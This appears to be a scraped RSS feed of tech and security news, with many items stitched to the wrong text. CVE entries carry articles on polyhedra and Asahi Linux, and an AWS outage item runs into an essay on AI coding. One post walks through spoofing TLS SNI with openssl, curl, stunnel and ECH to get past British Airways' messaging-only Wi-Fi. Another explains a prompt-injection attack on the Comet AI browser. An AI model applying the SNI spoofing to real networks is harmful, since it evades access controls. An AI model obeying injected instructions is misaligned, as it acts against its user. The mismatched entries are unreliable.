May 2025, during which the group compromised more than 60 user accounts within a single organization. The attackers conducted extensive reconnaissance in SharePoint and OneDrive, searching for financial workflows, IT documentation, and virtual machine configurations, all tied to gift card systems.Exploiting cloud identities rather than endpoints furthers the trend of cloud-based cybercrime, where phished credentials and identity abuse enable financially motivated actors to scale operations while remaining under the radar. Jungle Thief’s campaign is a reminder to prioritize identity-based monitoring and cloud-native security measures that provide full visibility and real-time detection.The Ugly | PhantomCaptcha Spearphishing Targets Ukraine’s Relief Networks and humanitarian organizations such as the International Red Cross, UNICEF, the Norwegian Refugee Council, and other NGOs linked to war relief efforts.Launched on October 8, 2025, the operation began with an impersonation of the Ukrainian President’s Office, distributing weaponized PDF attachments that redirected victims to a fake Zoom site (). There, a fake Cloudflare CAPTCHA lured users into copying and pasting malicious PowerShell commands – a ClickFix technique designed to bypass traditional endpoint controls by tricking victims into executing the malware themselves.Once running, the script deployed a multi-stage PowerShell payload leading to a WebSocket remote access trojan (RAT) hosted on Russian-owned infrastructure.

Although investigations show that .SentinelLABS linked the campaign to an additional Android-based espionage effort hosted on , which distributes spyware-laden APKs disguised as adult entertainment or cloud storage apps designed to harvest contacts, media files, and geolocation data.While attribution remains unconfirmed, technical overlaps, including the ClickFix lure and Russian-hosted C2s, suggest possible ties to COLDRIVER (UNC4057 or Star Blizzard), a threat group linked to Russia’s Federal Security Service (FSB). PhantomCaptcha is an example of a highly organized and adaptive adversary, able to blend social engineering, short-lived but highly compartmentalized infrastructure, and cross-platform espionage to target Ukraine’s humanitarian and government sectors.]]></content:encoded></item><item><title>Why I code as a CTO</title><link>https://www.assembled.com/blog/why-i-code-as-a-cto</link><author>johnjwang</author><category>dev</category><pubDate>Fri, 24 Oct 2025 16:03:53 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Many CTOs I know stopped writing code years ago. The conventional wisdom is that as you become more and more senior, the less and less code you write until eventually you’re spending your days in back-to-back meetings.That’s not how I operate. In fact, here’s what my last 12 months have looked like:I currently manage no direct reports and ship a lot of code. Not in an “I dabble when I have free time in between meetings” way, but in an “I shipped multiple substantial features last quarter” way.I think it’s one of the highest-leverage things I do as a technical leader.People assume CTOs who code are either working on pet projects that never ship or doing ceremonial code reviews. That hasn’t been my experience. The code I write falls into three pretty distinct categories, each valuable for different reasons.Long-horizon experimental projectsThe number of people in an organization who can ship and build substantially new things is actually a scarce resource. Organizations are generally organisms built in a way to maintain status quo and scale current products. I've found there are only a handful of people (founders, a few executives, some really high leverage ICs) who are able to generate new products. So pushing new ideas is quite important because they require intentional, sustained effort. Between org structure, roadmap incentives, and limited risk budget, few engineers can take months to pursue ambiguous bets.I can. And I’m uniquely positioned to take these meaty experimental projects on as I know the customer pain and the architecture well enough to move fast.I've had my share of duds, but I've also had some huge hits. A recent example: we kept talking about building an AI chat product for our customers. It was clearly valuable, but it felt like a daunting task, and no one on the team had the time and headspace to take it on given their existing commitments. During Thanksgiving break, I just decided to build it and knocked out a prototype. I then worked with the team to productionize it into a multi-million dollar ARR product.Critical customer asks that needed to be done yesterdaySometimes a key customer needs something urgently and it becomes a blocker for a major deal or renewal. These situations require someone who can move fast, understands the full system, and can make pragmatic trade-offs.Instead of pulling an engineer off their current sprint, I can often cut through the noise. I already have the context and I know the stakes.Last month, we had a million dollar per year customer that came to us with a burning need: they needed full data redaction on one of our integrations for compliance reasons. Our team had considered potentially having the customer build their own integration on top of our API in order to get around this requirement, and scoping it out properly would have required many meetings across product, legal, and engineering. I built and shipped a working version in a day. It wasn’t perfect, but it solved their immediate problem and preserved goodwill with the customer.Bugfixes (the surprising one)People are often shocked by this, but I fix a lot of bugs! And bugfixing is one of my favorite ways to maintain a mental map of our codebase.When you're hunting down why pagination breaks on the third page of search results, or why WebSocket connections drop after exactly 60 seconds, you traverse huge swaths of the system. You get a visceral understanding of technical debt that's hard to get from code reviews or architecture discussions. This mental map helps me make better decisions about technical investments and where the team should focus.That’s what I ship. Here’s why I structure my role this way:It keeps me up to date with what actually worksI use Claude Code, Codex, Cursor, and a bunch of other AI tools daily. This experience lets me understand what’s real and what’s bullshit when making strategic decisions about tooling and hiring.Here’s a recent example: I spent hours this weekend trying to vibe-coding a feature that touched a few gnarly integrations, but made way more progress when I finally sat down and wrote it mostly by hand. It wasn’t very much code, but it had to be the exact right logic (terrible for LLMs). On the other hand, I’ve shipped a big feature almost entirely with Claude Code. Knowing where AI shines (crud, tests, boilerplate) and where it fails (precision, system nuance) always beats making decisions based on Twitter hype.Being in the code also lets me know when to push and when to let off the gas. I can sense when architectures are overly complex or when technical debt is becoming a real problem. I’ve seen managers who rely only on what people tell them, and they can miss a lot. When you’re in the code, you develop an intuition for what’s real.Because it’s what I love and what I’m good atI don’t particularly enjoy building orgs and figuring out people stuff. Engineering management involves navigating interpersonal dynamics, performance reviews, and organizational design. These are crucial functions, but they’re not where my strengths lie.That’s why we’ve hired great engineering managers and leaders. They’re better at it than I am, and they enjoy it. This lets me focus on the things that I love: building things, solving technical problems, and writing code.Startups are kind of like a sprinting marathon, so I design my role around the work that keeps me excited and ready to run fast for a long time. That’s how I can continue doing this for years, which matters a lot for the company.AI tools have changed the leverage I haveA few years ago, I struggled to find time to code while handling the strategic parts of my job. As the company grew, I was basically stuck in meetings all day, and I was operating outside my zone of genius. It was one of the toughest periods for me professionally.But modern AI tools have fundamentally changed this equation (especially in the last few months). I’m probably 2–3x more productive than before. These tools haven’t replaced my judgment or technical knowledge, they’ve actually made those skills more valuable.I can tell an AI tool, “Build a data export that matches the format of our existing CSV exports but includes these three additional fields from the user profile table,” and it’ll generate most of the code correctly because I know exactly what I need and where to find it. An engineer unfamiliar with that part of the codebase would spend quite a lot of time figuring out those details.The job has shifted from “writing every line of code” to “providing context, making decisions, and evaluating solutions.” And luckily, I have a lot of context.Figuring out what works for youWhen I was figuring out my role as CTO, I read Greg Brockman’s blog post about defining the CTO role at Stripe. He talked to a bunch of other CTOs and realized there’s enormous variance in what the role looks like. Some CTOs are technical visionaries, some are org builders, some are infrastructure-focused. The commonality is that great CTOs figure out where they can create the most value given their particular skills, interests, and company context.For me, that’s meant writing a lot of code. It works because of my particular context: I enjoy building software more than org design, I have deep customer and codebase knowledge that makes me particularly effective, and we’ve hired strong engineering managers.But this is my particular path, not a prescription. The CTO role is remarkably flexible. Whether building orgs, or developing product strategy, or something else — technical leadership varies depending on your strengths, what energizes you, and what your company needs.If you’re an engineer worried that leadership means abandoning technical work, know that there are many paths. The key is figuring out where you’re uniquely great.We’re building AI-powered tools to transform customer support, and we need technical folks who aren’t afraid to get their hands dirty. If this sounds like your kind of environment, Thanks to Calvin French-Owen, Dan Robinson, Dave Story, and Cai Wangwilt for helping me hone my thoughts on this topic and to Whitney Beyer for reading drafts of this.]]></content:encoded></item><item><title>Amazon: This week’s AWS outage caused by major DNS failure</title><link>https://www.bleepingcomputer.com/news/technology/amazon-this-weeks-aws-outage-caused-by-major-dns-failure/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Fri, 24 Oct 2025 15:33:58 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Amazon says a major DNS failure was behind a massive AWS (Amazon Web Services) outage that took down many websites and online services on Monday.

But their skills and time are highly leveraged with a support team that handles prep, secondary tasks, admin. The surgeon focuses on the important stuff they are uniquely good at.My current goal with AI coding tools is to spend 100% of my time doing stuff that matters. (As a UI prototyper, that mostly means tinkering with design concepts.)It turns out there are a LOT of secondary tasks which AI agents are now good enough to help out with. Some things I’m finding useful to hand off these days:Before attempting a big task, write a guide to relevant areas of the codebaseSpike out an attempt at a big change. Often I won’t use the result but I’ll review it as a sketch of where to goFix typescript errors or bugs which have a clear specificationWrite documentation about what I’m buildingI often find it useful to run these secondary tasks async in the background – while I’m eating lunch, or even literally overnight!When I sit down for a work session, I want to feel like a surgeon walking into a prepped operating room. Everything is ready for me to do what I’m good at.Notably, there is a  difference between how I use AI for primary vs secondary tasks.For the core design prototyping work, I still do a lot of coding by hand, and when I do use AI, I’m more careful and in the details. I need fast feedback loops and good visibility. (eg, I like Cursor tab-complete here)Whereas for secondary tasks, I’m much much looser with it, happy to let an agent churn for hours in the background. The ability to get the job done eventually is the most important thing; speed and visibility matter less. Claude Code has been my go-to for long unsupervised sessions but Codex CLI is becoming a strong contender there too, possibly my new favorite.These are  different work patterns! Reminds me of Andrej Karpathy’s “autonomy slider” concept. It’s dangerous to conflate different parts of the autonomy spectrum – the tools and mindset that are needed vary quite a lot.Your agent doesn’t need a career trajectoryThe “software surgeon” concept is a very old idea – Fred Brooks attributes it to Harlan Mills in his 1975 classic “The Mythical Man-Month”. He talks about a “chief programmer” who is supported by various staff including a “copilot” and various administrators. Of course, at the time, the idea was to have humans be in these support roles.OK, so there is a super obvious angle here, that “AI has now made this approach economically viable where it wasn’t before”, yes yes… but I am also noticing a more subtle thing at play, something to do with status hierarchies.A lot of the “secondary” tasks are “grunt work”, not the most intellectually fulfilling or creative part of the work. I have a strong preference for teams where everyone shares the grunt work; I hate the idea of giving all the grunt work to some lower-status members of the team. Yes, junior members will often have more grunt work, but they should also be given many interesting tasks to help them grow.With AI this concern completely disappears! Now I can happily delegate pure grunt work. And the 24/7 availability is a big deal. I would never call a human intern at 11pm and tell them to have a research report on some code ready by 7am… but here I am, commanding my agent to do just that!Finally I’ll mention a couple thoughts on how this approach to work intersects with my employer, Notion.First, as an employee, I find it incredibly valuable right now to work at a place that is bullish on AI coding tools. Having support for heavy use of AI coding tools, and a codebase that’s well setup for it, is enabling serious productivity gains for me –  as a newcomer to a big codebase.Secondly, as a product – in a sense I would say we are trying to bring this way of working to a broader group of knowledge workers beyond programmers. When I think about how that will play out, I like the mental model of enabling everyone to “work like a surgeon”.The goal isn’t to delegate your core work, it’s to identify and delegate the secondary grunt work tasks, so you can focus on the main thing that matters.If you liked this perspective, you might enjoy reading these other posts I’ve written about the nature of human-AI collaboration:]]></content:encoded></item><item><title>Fake LastPass death claims used to breach password vaults</title><link>https://www.bleepingcomputer.com/news/security/fake-lastpass-death-claims-used-to-breach-password-vaults/</link><author>Bill Toulas</author><category>security</category><pubDate>Fri, 24 Oct 2025 14:47:48 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[LastPass is warning customers of a phishing campaign sending emails with an access request to the password vault as part of a legacy inheritance process.

I’d done the same flight back in 2023, and remember relying on the in-flight entertainment for the 14 hour journey. However, this time on my way to London, they had an interesting offer: Free WiFi for “Messaging”, for members of “The British Airways Club”.I was pretty sure I wasn’t a member of any sort of club (I’m only flying economy anyway); but turns out this is just the name of their frequent flyer program. Conveniently enough, you’re able to sign up for this via the captive portal while in the sky; and although it asks for your E-Mail you don’t need to verify it (thereby allowing you to complete the signup without access to the internet).Once signed in, the captive portal invited me to “Start session”, which true to it’s word, let me start texting people. I tried Whatsapp, Signal, Wechat and Discord. The first three worked (though not for images), Discord expectedly did not. Not bad for free wifi!This was the first question I had as soon as I confirmed messaging did work. It’s 2025; everything should be encrypted in transit. So how does it know if I’m using Whatsapp vs. Discord? One idea I had is it just somehow capped the bandwidth / data transfer of individual TCP connections; so when you’re sending a single message or two it gets through, but something larger would fail.To test this, I used my phone to open up the classic: example.com. Unfortunately this didn’t load - so there must’ve been a bit more going on…Thankfully I had my laptop on me, so the next step was to connect to WiFi with the devtools open to the network tab, and wireshark on the side for good measure. After registering for the WiFi again, it was time to play around a bit. Opening up something like example.com revealed a TCP reset in the wireshark, right after the Client Hello, and my brain immediately jumped to SNI. It’s something that’s really annoyed me about the TLS spec since it’s widely used by ISPs in India to block websites (although there is work being done to fix this; ECH (which was itself previously ESNI)).tl;dr SNI reveals the domain name of EVERY website you connect to in the TLS handshake, before the tunnel is established! Although the actual contents of what you’re doing, on say, totallynondodgywebsite.com are encrypted, anyone on the wire can see that you connected to it (including ISPs). My guess was that they had a set of whitelisted domains used by messaging apps, and if they see anything else, they just reset the connection.Sidebar: people’s reactions when I try to tell this are always extremely varied. Many of my non-technical friends think anything you do without a VPN is visible to everyone, while some slightly technical ones still think that the URL (including query params) is visible, but the responses are not. Finally there is some subset of people who believe TLS means all data is encrypted in transit between client & server, though they had no idea SNI leaks all the domains they visit!Although BA blocks DNS queries to all (well all I could remember) public resolvers, they do resolve any domain you throw at them, including MX, TXT, HTTPS records. (This itself could be an interesting area of exploration; especially since the DNS resolution can be triggered before signing up for free WiFi. Something along the lines of arbitrary subdomains which represent the request payload, and a custom nameserver that returns responses via the TXT record or something. Anyway…).Getting the A record of my personal server, I made a TLS handshake to the IP address directly, without any SNI. This was then reset by BA; so the lack of SNI is also blocked!$ openssl s_client -connect 95.217.167.10:443

The next step was to try and test some SNI that might go through. Off the top of my head, I knew  was used by Whatsapp for some stuff, so I decided to use it. The way SNI works is it tells the server which host you want to connect to, so it can present the right TLS certificate. In my case, my server did not have any cert for  , but NGINX seemingly just ignores the SNI if it doesn’t exist and returns the first cert (I think; could also be related to my config but I didn’t look to much into this).But basically, as long as I (the client) don’t care, I can complete the TLS connection for any random cert the server offers me, even if in the SNI I provide a domain I don’t control (e.g.  in this case).$ openssl s_client -connect 95.217.167.10:443 -servername wa.me

I successfully managed to request and receive my homepage! All ~5KiB of it, not bad. Now the challenge was to extend this to browse any website…Ok, my relationship with SNI isn’t as cliche as that, and I think we’re still enemies. But this opens up some exciting opportunities to say the least. If I can convince BA that I’m connecting to , I can potentially do whatever I want over that connection (under the guise of “messaging”). So the requirments were:Establish a TLS connection using the SNI Tunnel arbitrary traffic through that connectionDo all this without actually owning / controlling the  domainFrom my past experiences w/ reverse-engineering etc., the most obvious way to do this seemed to be an HTTPS proxy. It had to be HTTPS specifically, since the connection to proxy was going to be what I’d “fake” as Whatsapp. If the TLS handshake to the HTTPS proxy had the SNI  , BA  let it through, and then I can make the real requests I want via the proxy.Unfortunately I was in the air, and without easy access to the internet to manage my servers and the like, I couldn’t quite set all of this up; I’d have to do that while on holiday and test it on the flight back. I could  and emulate the BA restrictions etc. while on thr ground, but I decided to YOLO it.I managed to find one of my VPSs that wasn’t already using port 443. Let’s assume the public IP was  (yes I know octets don’t go beyond , if you really want my IP check the screenshots below). I then setup an HTTP proxy on it using tinyproxy. However this just sets up a basic HTTP proxy, which was listening on .To add the TLS layer, I used stunnel. For the TLS setup of stunnel, I just generated some self-signed certs via openSSL using all defaults, except the common name (CN), for which I used , since I wanted to try and ensure max compatibility (e.g. the client doesn’t reject due to unexpected SNI vs. CN, or the server not knowing which cert to provide).openssl req -nodes -newkey ed25519 -keyout ssl.key -x509 -days 365 -out ssl.crt
 actually, on the client I decided to ignore TLS errors (self-signed cert), and stunnel didn’t care about SNI, so this () didn’t matter too much. But for more legit use cases it definitely does!To just make sure the proxy worked as expected, I tried it via curl directly on the IP:$ curl -x https://user:pass@333.333.333.333:443 ifconfig.co -v
*   Trying 333.333.333.333:443...
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
*  CAfile: /etc/ssl/certs/ca-certificates.crt
*  CApath: none
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):

* TLSv1.3 (OUT), TLS alert, unknown CA (560):
* SSL certificate problem: self-signed certificate
* closing connection #0
curl: (60) SSL certificate problem: self-signed certificate
More details here: https://curl.se/docs/sslcerts.html

curl failed to verify the legitimacy of the server and therefore could not
establish a secure connection to it. To learn more about this situation and
how to fix it, please visit the webpage mentioned above.
Of course! I just randomly generated the certs on my VPS, not signed by a “trusted” CA or anything. Well, we can tell cURL to ignore TLS errors for the proxy with the  flag, and now it works; the response is the IP of my VPS.However there’s a problem - if I connect to the proxy directly via the IP, there is no SNI extension set, so this would get blocked. The SNI extension is set when connection to a domain, so I need to configure  to point to . This can be done via the hosts file of course, but cURL also provides a quick CLI hack via :curl --resolve wa.me:443:333.333.333.333 -x https://username:password@wa.me ifconfig.co --proxy-insecure -v
This tells cURL how to resolve the IP. With this, I could now see the SNI being set to  via wireshark, and the connection to the proxy succeeding (TLS errors about the self-signed cert ignored of course). Not bad, now time to wait for my flight back to Hong Kong…If I’d messed something up, I was cooked, since without internet access I wouldn’t be able to fix it! My flight back was at 1935hrs local time, but I’d been up since 0400 thanks to an early morning flight in from Edinburgh, and then spent the day browsing the markets, having pints and watching the Emilia Romagna Grand Prix. The place I went to even had screens above the urinals!Anyway, despite being up for ~16 hours already, I was ready to see if my work would, well, work. Once we were sky-high, I connected to the WiFi (from my laptop), signed up for the BA loyalty program, and activated the “Messaging” plan. Trying the curl command from above, I got back an HTTP 200 from  with my VPS IP; it worked! For good measure I tried cURLing some more websites like example.com, google.com etc. to make sure stuff seemed fine.The next challenge was to extend this to web browsing. Thankfully most modern browsers support sending traffic through an HTTPS proxy, and chromium even has a flag to disable TLS cert warnings (so it won’t complain about my self-signed cert, which obviously doesn’t belong to the real ).I also had to set a DNS record for  to  in my hosts file, so chromium would set the SNI to  in the TLS handshake, but the connection would be made to my VPS. Since the bandwidth would probably be quite limited (owing to not just the internet on an airplane, but proxying it via a VPS in Netherlands), I decided to load a very simple, text-heavy website: Hacker News.Bada bing bada boom! Looks like we cooked. I can actually browse HN using BA’s free “messaging” WiFi! (Note: the reason you can see the HTTP requests in plaintext in wireshark is because I used SSLKEYLOGFILE and configured wireshark to decrypt TLS).Unfortunately, trying to load websites with heavier assets would fail, with images on simple text blogs loading line-by-line. Well, at least its some dial-up nostalgia!My guess is that on the free WiFi, apart from the SNI checks, they also throttle the bandwidth. Maybe they anticipated this kind of circumvention. On the other hand, if this is really the internet speed that the full plan unlocks…Earlier above I talked about work being done to fix the SNI leakage: ECH. The scope of explaining how it works is out of scope here, but I do encourage you to read up on it. Pretty good stuff! It’ll help this section make more sense.Anyway, since ECH world, the public SNI is purely for the server to complete the outer ClientHello, and since ECH clients set the public SNI based on the ECHConfig, I can type in my real domain in firefox, which will still use the  domain as the public SNI. The inner Client Hello will then occur securely, containing the real SNI of , and the handshake will complete with the “legit” CA-signed certificate for that domain.This worked as well, and without any TLS ignore flags, since the actual cert for  was signed by a “trusted CA” (Let’s Encrypt). What’s more interesting is that this worked even on a non-standart TLS port: ! Not sure exactly why, but I’m not complaining.A note on ECHConfig resolutionTypically, ECHConfigs should be resolved via encrypted DNS, such as DNS-over-HTTPS. I believe this is what firefox does by default. I am not 100% sure if this is what happened while I was in flight, since I’d think the DoH would be blocked on messaging WiFi? Or maybe they allow the DoH SNI as well, since newer phones default to that. If any of you are flying BA anytime soon, try it out and let me know!SNI: Don’t blindly trust itSNI, as the name indicates (sorry) is just a “hint” of sorts, from the client to the server. If someone controls both sides (client & server), they can put whatever fake value they want in here, for middleboxes to sniff out and try to analyze. While this unfortunately does work for applications like censorship (where an ISP or country is trying to block a particular website), for use cases such as threat detection it should not be relied on; malwre authors can “spoof” the SNI when connecting to their C&C, since they don’t actually need it, but it may look more innocent to middleboxes.]]></content:encoded></item><item><title>CVE-2025-8536 - SQL Injection in DobryCMS</title><link>https://cvefeed.io/vuln/detail/CVE-2025-8536</link><author></author><category>vulns</category><pubDate>Fri, 24 Oct 2025 14:18:20 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-8536

This rules out one point in the parameter space.But you may be able to rule out much more than a single point. If the second shadow sticks out significantly, it would require a big change to move it inside the first shadow. In other words, you can rule out not just your initial orientation but also “nearby” orientations — an entire block of points in the parameter space. Steininger and Yurkevich came up with a result they called their global theorem, which quantifies precisely how large a block you can rule out in these cases. By testing many different points, you can potentially rule out block after block in the parameter space.If these blocks cover the entire parameter space, you’ll have proved that your shape is a Nopert. But the size of each block depends on how far the second shadow sticks out beyond the first, and sometimes it doesn’t stick out very far. For instance, suppose you start with the two shapes in exactly the same position, and then you slightly rotate the second shape. Its shadow will at most stick out just a tiny bit past the first shadow, so the global theorem will only rule out a tiny box. These boxes are too small to cover the whole parameter space, leaving the possibility that some point you’ve missed might correspond to a Rupert tunnel.To deal with these small reorientations, the pair came up with a complement to their global theorem that they called the local theorem. This result deals with cases where you can find three vertices (or corner points) on the boundary of the original shadow that satisfy some special requirements. For instance, if you connect those three vertices to form a triangle, it must contain the shadow’s center point. The researchers showed that if these requirements are met, then any small reorientation of the shape will create a shadow that pushes at least one of the three vertices further outward. So the new shadow can’t lie inside the original shadow, meaning it doesn’t create a Rupert tunnel.If your shape casts a shadow that lacks three appropriate vertices, the local theorem won’t apply. And all the previously identified Nopert candidates have at least one shadow with this problem. Steininger and Yurkevich sifted through a database of hundreds of the most symmetric and beautiful convex polyhedra, but they couldn’t find any shape whose shadows all worked. So they decided to generate a suitable shape themselves.They developed an algorithm to construct shapes and test them for the three-vertices property. Eventually, the algorithm produced the Noperthedron, which is made of 150 triangles and two regular 15-sided polygons. It looks like a rotund crystal vase with a wide base and top; one fan of the work has already 3D-printed a copy to use as a pencil holder.]]></content:encoded></item><item><title>CVE-2025-43995 - Dell Storage Center - Dell Storage Manager Authentication Bypass</title><link>https://cvefeed.io/vuln/detail/CVE-2025-43995</link><author></author><category>vulns</category><pubDate>Fri, 24 Oct 2025 14:09:55 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-43995

The Asahi Linux developers involved with working on Linux support for Apple Silicon M-Series devices have put out a new progress report on their development efforts.
Asahi Linux developers have kept working on new kernel patches and some being upstreamed for Linux 6.17 and 6.18 cycles, as previously covered on Phoronix. Notably with Linux 6.18 is the Device Trees for the Apple M2 Pro / Max / Ultra devices albeit more driver code is still working its way upstream.
Asahi Linux developers are also working on moving toward the Rust programming language with their important m1n1 bootloader for Apple Silicon. They feel going to Rust is important for such a critical piece of software for better maintainability, safety, and ensuring the correct logic.
Asahi Linux developers have also made progress on getting more games working on Apple Silicon devices. Wine is also now working outside of muvm and their graphics driver support continues maturing:
With the upstream Linux kernel work around Apple Silicon so far being focused on Apple M1 and M2, you may be wondering about M3 and M4 or the recently announced M5... They still are battling Apple M3 bring-up. Today's progress report comments:
"It may be surprising to learn that very basic, low-level support for M3 has existed for quite some time now. m1n1 is capable of initialising the CPU cores, turning on some critical peripheral devices, and booting the Asahi kernel. However, the level of support right now begins and ends with being able to boot to a blinking cursor. Naturally, this level of support is not at all useful for anything but low-level reverse engineering, but we of course plan on rectifying this in due time..."See the progress report in full over on AsahiLinux.org.]]></content:encoded></item><item><title>APT36 Targets Indian Government with Golang-Based DeskRAT Malware Campaign</title><link>https://thehackernews.com/2025/10/apt36-targets-indian-government-with.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhQlLDV9eHmX0UxtlV_GgmAOIgKuN8Ko4GLu13DsbfOsmXOvZCCfJFJYTu4bWeUaVoNQdQvqwitjs9X6gMRTAMc_42zGhH59sINyGokJo-7HwggyEP6v0NqKmiLlMHl2WDVoclCkkDXEAsE-ZN3Yz1ADcLXPV5vRtrIKTP07e87JvUg72soCwq2BwffNjbD/s1600/indian-cyberattack.jpg" length="" type=""/><pubDate>Fri, 24 Oct 2025 14:00:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[A Pakistan-nexus threat actor has been observed targeting Indian government entities as part of spear-phishing attacks designed to deliver a Golang-based malware known as DeskRAT.

It seems like everything suddenly wants to be “powered by AI.“ If it’s not, it’s considered old school and boring. It’s easy to get swept up in the promise: smarter tools, less work, and maybe even a glimpse of the future.But if we look at some of the things we learned just this week, that glimpse doesn’t only promise good things. There’s a quieter story running alongside the hype that you won’t see in the commercials. It’s the story of how AI’s rapid development is leaving security and privacy struggling to catch up.And if you make use of AI assistants, chatbots, or those “smart” AI browsers popping up on your screen, those stories are worth your attention.Are they smarter than us?Even some of the industry’s biggest names—Steve Wozniak, Sir Richard Branson, and Stuart Russel—are worried that progress in AI is moving too fast for its own good. In an article published by ZDNet, they talk about their fear of “superintelligence,” saying they’re afraid we’ll cross the line from “AI helps humans” to “AI acts beyond human control” before we’ve figured out how to keep it in check.These scenarios are not about killer robots or takeovers like in the movies. They’re about much smaller, subtler problems that add up. For example, an AI system designed to make customer service more efficient might accidentally share private data because it wasn’t trained to understand what’s confidential. Or an AI tool designed to optimize web traffic might quietly break privacy laws it doesn’t comprehend.At the scale we use AI—billions of interactions per day—these oversights become serious. The problem isn’t that AI is malicious; it’s that it doesn’t understand consequences, and developers forget to set boundaries.We’re already struggling to build basic online safety into the AI tools that are replacing our everyday ones.AI browsers: too smart, too soonAI browsers—and their newer cousin, the ‘agentic’ browser—do more than just display websites. They can read them, summarize them, and even perform tasks for you.A browser that can search, write, and even act on your behalf sounds great—but you may want to rethink that. According to research reported by Futurism, some of these tools are being rolled out with deeply worrying security flaws.Here’s the issue: many AI browsers are just as vulnerable to prompt injection as AI chatbots. The difference is that if you give an AI browser a task, it runs off on its own and you have little control over what it reads or where it goes. Take Comet, a browser developed by the company Perplexity. Researchers at Brave found that Comet’s “AI assistant” could be tricked into doing harmful things simple because it trusted what it saw online. In one test, researchers showed the browser a seemingly innocent image. Hidden inside that image was a line of invisible text—something no human would see, but instructions meant only for the AI. The browser followed the hidden commands and ended up opening personal emails and visiting a malicious website.In short, the AI couldn’t tell the difference between a user’s request and an attacker’s disguised instructions. That is a typical example of a prompt injection attack, which works a bit like phishing for machines. Instead of tricking a person into clicking a bad link, it tricks an AI browser into doing it for you. Without the realization of “oops, maybe I shouldn’t have done that,” it is faster, quiet, and with access you might not even realize it has.The AI has no idea it did something wrong. It’s just following orders, doing exactly what it was programmed to do. It doesn’t know which instructions are bad because nobody taught it how to tell the difference.Even if the AI engine itself worked perfectly, attackers have another way in: fake interfaces.According to BleepingComputer, scammers are already creating spoofed AI sidebars that look identical to genuine ones from browsers like OpenAI’s Atlas and Perplexity’s Comet. These fake sidebars mimic the real interface, making them almost impossible to spot. Picture this: you open your browser, see what looks like your trusted AI helper, and ask it a question. But instead of the AI assistant helping you, it’s quietly recording every word you type.Some of these fake sidebars even persuade users to “verify” credentials or “authorize” a quick fix. This is social engineering in a new disguise. The scammer doesn’t need to lure you away from the page, they just need to convince you that the AI you’re chatting with is legitimate. Once that trust is earned, the damage is done.And since AI tools are designed to sound helpful, polite, and confident, most people will take their word for it. After all, if an AI browser says, “Don’t worry, this is safe to click,” who are you to argue?The key problem right now is speed. We keep pushing the limits of what AI can do faster than we can make it safe. The next big problem will be the data these systems are trained on.As long as we keep chasing the newest features, companies will keep pushing for more options and integrations—whether or not they’re ready. They’ll teach your fridge to track your diet if they think you’ll buy it.As consumers, the best thing we can do is stay informed about new developments and the risks that come with them. Ask yourself: Do I really need this? What am I trusting it with? What’s the potential downside? Sometimes it’s worth doing things the slower, safer way.Pro tip: I installed Malwarebytes’ Browser Guard on Comet, and it seems to be working fine so far. I’ll keep you posted on that.We don’t just report on threats – we help safeguard your entire digital identityCybersecurity risks should never spread beyond a headline.

It's increasingly being used in the industry: For manually written documents, partially automated reports, and in fully automated batch PDF generation pipelines. Across these use cases, it's being used in production for critical documents.In August, we launched a new website to reflect Typst's expanding scope, and now, with Typst 0.14, we're shipping crucial features that make Typst even more widely applicable.If you need to comply with accessibility-related regulations, Typst 0.14 has your back. Typst now generates accessible documents  with opt-in support for stricter checks. For those working with complex illustrations, PDFs are now supported as a native image format. In case you're typesetting a book, the new character-level justification will give your layout the final touch. And if you're building a website or blog, many improvements to Typst's HTML export are waiting for you.In this blog post, we'll take a closer look at the highlights of this release:To get started with Typst 0.14… Just open any of your projects! You'll get a prompt offering you to upgrade to the latest version. Run  in your terminal or, if you haven't installed Typst previously, download the latest version of the CLI.For a comprehensive overview of all changes in the release, visit the changelog. If you're looking to upgrade your document to Typst 0.14, you can also skip ahead to the Migration section.Not everyone reads PDF documents the same. Some people read on large screens or print; others use small phones or screen readers to have documents read aloud. To cater to all these uses, a file must contain  that allow Assistive Technology (AT) like screen readers to learn about the reading order and semantic meaning of each piece of text. Tags allow AT users to learn which text is , enable navigation of the document by skipping between headings, and more.Tagging requires no additional work from you: If you are using the built-in markup and elements, Typst will automatically select the right tags! Unlike many other tools, PDF files created with Typst 0.14 are tagged by default, raising the bar for accessibility.But tags are not enough to make a file accessible: To reach everyone, you need to design for universal accessibility from the start. The new features in Typst 0.14 can help you with that. Consider diagrams created with shapes or packages like cetz—their visual meaning is invisible to assistive technology. The new  parameter on figures solves this:With this change, AT users hear the alternative description and can grasp the figure's purpose just like sighted users—no information is lost. We have put together a new Accessibility Guide that contains more tips on how to create accessible documents, including how to write good alternative descriptions, when to use the figure's vs. the image's  parameter, and more.To make sure you got everything right, you can enable the new PDF/UA-1 export. PDF/UA is an international standard that helps to create universally accessible PDF files. When it is enabled, Typst will run additional checks against your document to find accessibility issues and optimize for accessibility rather than compatibility. It will find issues such as missing document titles, wrong heading hierarchies, and missing alternative descriptions.PDF/UA-1 helps you comply with existing and upcoming international accessibility regulation like the European Accessibility Act (EAA) in the EU and the new Americans with Disabilities Act's (ADA) Title II guidance by the DOJ. The former applies to many businesses active in the European Union since 28 June 2025 while the deadline for the latter is set for April 24, 2026. If you are using Typst in your business for customer- or government-facing documents, you should adopt Typst 0.14 as soon as possible.Alongside PDF/UA-1 support, we've also generally expanded Typst's support for PDF standards. Instead of just PDF 1.7, you can now choose between the PDF versions 1.4, 1.5, 1.6, 1.7, and 2.0. And for PDF/A, we've expanded support from just two specific substandards to all four parts with all their conformance levels. While Typst's defaults are perfectly fine for most use cases, choosing a standard can optimize your document specifically for your use case. Consult the expanded PDF documentation in the reference for guidance on which standards you should pick under which circumstances.Staying with the PDF theme, there are exciting news for authors that have a lot of complex illustrations. 